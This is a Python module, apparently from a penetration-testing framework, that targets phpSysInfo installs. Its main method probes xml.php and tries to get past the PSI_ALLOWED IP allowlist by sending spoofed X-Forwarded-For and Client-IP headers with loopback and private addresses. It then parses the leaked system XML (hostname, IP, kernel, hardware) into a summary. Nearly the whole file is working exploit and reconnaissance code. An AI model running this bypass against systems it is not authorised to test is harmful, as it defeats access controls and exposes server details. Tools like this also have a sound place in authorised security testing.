#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import xml.etree.ElementTree as ET
from typing import Any, Iterable, List, Optional, Sequence, Tuple

from core.framework.base_module import BaseModule

_DENIED_MARKERS = ("not allowed", "client ip address")

_BYPASS_HEADERS: Tuple[Tuple[str, str], ...] = (
    ("X-Forwarded-For", "x-forwarded-for"),
    ("Client-IP", "client-ip"),
)

_DEFAULT_SPOOF_IPS: Tuple[str, ...] = (
    "127.0.0.1",
    "::1",
    "10.0.0.1",
    "192.168.0.1",
    "192.168.1.1",
    "172.16.0.1",
    "8.8.8.8",
    "1.1.1.1",
)

_VERSION_RES = (
    re.compile(r"phpsysinfo[^0-9]{0,24}(\d+\.\d+\.\d+)", re.I),
    re.compile(r"<Version>(\d+\.\d+\.\d+)</Version>", re.I),
    re.compile(r'["\']version["\'][^0-9]{0,16}(\d+\.\d+\.\d+)', re.I),
)


class Phpsysinfo(BaseModule):
    """Helpers shared by phpSysInfo modules."""

    @staticmethod
    def phpsysinfo_normalize_base_path(base_path: Any) -> str:
        p = str(base_path or "/").strip()
        if not p.startswith("/"):
            p = "/" + p
        return p.rstrip("/")

    @classmethod
    def phpsysinfo_xml_paths(cls, base_path: Any) -> List[str]:
        prefix = cls.phpsysinfo_normalize_base_path(base_path)
        if prefix:
            return [f"{prefix}/xml.php"]
        return ["/xml.php", "/phpsysinfo/xml.php"]

    @classmethod
    def phpsysinfo_index_paths(cls, base_path: Any) -> List[str]:
        prefix = cls.phpsysinfo_normalize_base_path(base_path)
        if prefix:
            return [f"{prefix}/index.php", prefix + "/"]
        return ["/index.php", "/phpsysinfo/index.php", "/phpsysinfo/", "/"]

    @staticmethod
    def phpsysinfo_looks_like_denied(text: str) -> bool:
        if not text:
            return False
        low = text.lower()
        return any(marker in low for marker in _DENIED_MARKERS)

    @staticmethod
    def phpsysinfo_looks_like_xml(text: str) -> bool:
        if not text:
            return False
        sample = text.lstrip()[:4096].lower()
        if not (sample.startswith("<?xml") or sample.startswith("<phpsysinfo")):
            return False
        return "phpsysinfo" in sample or "<system" in sample or "<generation" in sample

    @staticmethod
    def phpsysinfo_looks_like_page(text: str) -> bool:
        if not text:
            return False
        low = text.lower()
        return "phpsysinfo" in low or "php sys info" in low or "psi_version" in low

    @staticmethod
    def phpsysinfo_extract_version(text: str) -> str:
        if not text:
            return ""
        for pattern in _VERSION_RES:
            match = pattern.search(text)
            if match:
                return match.group(1)
        return ""

    @staticmethod
    def phpsysinfo_version_tuple(version: str) -> Tuple[int, ...]:
        parts: List[int] = []
        for token in str(version).split("."):
            digits = "".join(ch for ch in token if ch.isdigit())
            parts.append(int(digits) if digits else 0)
        while len(parts) < 3:
            parts.append(0)
        return tuple(parts[:3])

    @classmethod
    def phpsysinfo_version_lte(cls, version: str, limit: str) -> bool:
        if not version or not limit:
            return False
        return cls.phpsysinfo_version_tuple(version) <= cls.phpsysinfo_version_tuple(limit)

    @classmethod
    def _phpsysinfo_header_choices(cls, mode: str) -> Sequence[Tuple[str, str]]:
        raw = str(mode or "all").strip().lower().replace("_", "-")
        if raw in ("all", "auto", "both", ""):
            return _BYPASS_HEADERS
        if raw in ("x-forwarded-for", "xff", "forwarded-for"):
            return (_BYPASS_HEADERS[0],)
        if raw in ("client-ip", "clientip"):
            return (_BYPASS_HEADERS[1],)
        return _BYPASS_HEADERS

    @classmethod
    def _phpsysinfo_spoof_ips(cls, spoof_ip: Any, extra_ips: Optional[Iterable[str]] = None) -> List[str]:
        ips: List[str] = []
        primary = str(spoof_ip or "").strip()
        if primary:
            ips.append(primary)
        if extra_ips:
            ips.extend(str(ip).strip() for ip in extra_ips if str(ip).strip())
        for candidate in _DEFAULT_SPOOF_IPS:
            if candidate not in ips:
                ips.append(candidate)
        return ips

    def phpsysinfo_fetch_xml(self, path: str, *, headers: Optional[dict] = None, timeout: int = 15):
        return self.http_request(
            method="GET",
            path=path,
            headers=headers,
            allow_redirects=False,
            timeout=timeout,
        )

    def phpsysinfo_probe_allowlist_bypass(
        self,
        *,
        base_path: str = "/",
        spoof_ip: str = "",
        header_mode: str = "all",
        timeout: int = 15,
    ) -> dict:
        """
        Probe xml.php for PSI_ALLOWED bypass via spoofed client IP headers.

        status: bypass | open | denied | not_found | not_phpsysinfo | error
        """
        header_choices = self._phpsysinfo_header_choices(header_mode)
        spoof_ips = self._phpsysinfo_spoof_ips(spoof_ip)
        version = ""

        for xml_path in self.phpsysinfo_xml_paths(base_path):
            try:
                baseline = self.phpsysinfo_fetch_xml(xml_path, timeout=timeout)
            except Exception as exc:
                return {
                    "status": "error",
                    "reason": str(exc),
                    "xml_path": xml_path,
                    "body": "",
                    "version": "",
                    "spoof_ip": "",
                    "header_name": "",
                }

            if not baseline or baseline.status_code not in (200, 403):
                continue

            body = baseline.text or ""
            version = self.phpsysinfo_extract_version(body) or version

            if self.phpsysinfo_looks_like_xml(body):
                return {
                    "status": "open",
                    "reason": "xml.php returned system XML without allowlist denial",
                    "xml_path": xml_path,
                    "body": body,
                    "version": version,
                    "spoof_ip": "",
                    "header_name": "",
                }

            if not self.phpsysinfo_looks_like_denied(body):
                continue

            for ip in spoof_ips:
                for header_name, _ in header_choices:
                    try:
                        resp = self.phpsysinfo_fetch_xml(
                            xml_path,
                            headers={header_name: ip},
                            timeout=timeout,
                        )
                    except Exception:
                        continue
                    if not resp or resp.status_code != 200:
                        continue
                    out = resp.text or ""
                    if self.phpsysinfo_looks_like_xml(out):
                        return {
                            "status": "bypass",
                            "reason": (
                                f"PSI_ALLOWED bypass via {header_name}: {ip} "
                                f"(baseline denied, spoofed header returned XML)"
                            ),
                            "xml_path": xml_path,
                            "body": out,
                            "version": self.phpsysinfo_extract_version(out) or version,
                            "spoof_ip": ip,
                            "header_name": header_name,
                        }

            return {
                "status": "denied",
                "reason": "Allowlist denial observed; bypass attempts with common spoof IPs failed",
                "xml_path": xml_path,
                "body": body,
                "version": version,
                "spoof_ip": "",
                "header_name": "",
            }

        for index_path in self.phpsysinfo_index_paths(base_path):
            try:
                resp = self.http_request(
                    method="GET",
                    path=index_path,
                    allow_redirects=True,
                    timeout=timeout,
                )
            except Exception:
                continue
            if not resp or resp.status_code != 200:
                continue
            text = resp.text or ""
            if self.phpsysinfo_looks_like_page(text):
                version = self.phpsysinfo_extract_version(text) or version
                return {
                    "status": "not_found",
                    "reason": "phpSysInfo fingerprint present but xml.php probe was inconclusive",
                    "xml_path": "",
                    "body": text,
                    "version": version,
                    "spoof_ip": "",
                    "header_name": "",
                }

        return {
            "status": "not_phpsysinfo",
            "reason": "No phpSysInfo fingerprint or xml.php response",
            "xml_path": "",
            "body": "",
            "version": "",
            "spoof_ip": "",
            "header_name": "",
        }

    @classmethod
    def phpsysinfo_parse_xml_summary(cls, xml_text: str) -> List[Tuple[str, str]]:
        if not xml_text or not cls.phpsysinfo_looks_like_xml(xml_text):
            return []

        rows: List[Tuple[str, str]] = []
        try:
            root = ET.fromstring(xml_text)
        except ET.ParseError:
            return []

        tag_paths = (
            ("Generation/Version", "Version"),
            ("Generation/Timestamp", "Timestamp"),
            ("System/Hostname", "Hostname"),
            ("System/IPAddr", "IP address"),
            ("System/Kernel", "Kernel"),
            ("System/Distro", "Distribution"),
            ("System/Uptime", "Uptime"),
            ("System/Load", "Load"),
            ("System/Processes", "Processes"),
        )

        for xpath, label in tag_paths:
            node = root.find(xpath)
            if node is not None and (node.text or "").strip():
                rows.append((label, node.text.strip()))

        for section_name in ("CPU", "Memory", "Network", "Hardware"):
            section = root.find(section_name)
            if section is None:
                continue
            for child in list(section)[:8]:
                name = child.tag
                text = (child.text or "").strip()
                if not text:
                    for sub in list(child)[:3]:
                        sub_text = (sub.text or "").strip()
                        if sub_text:
                            rows.append((f"{section_name}/{name}/{sub.tag}", sub_text))
                    continue
                rows.append((f"{section_name}/{name}", text))

        return rows
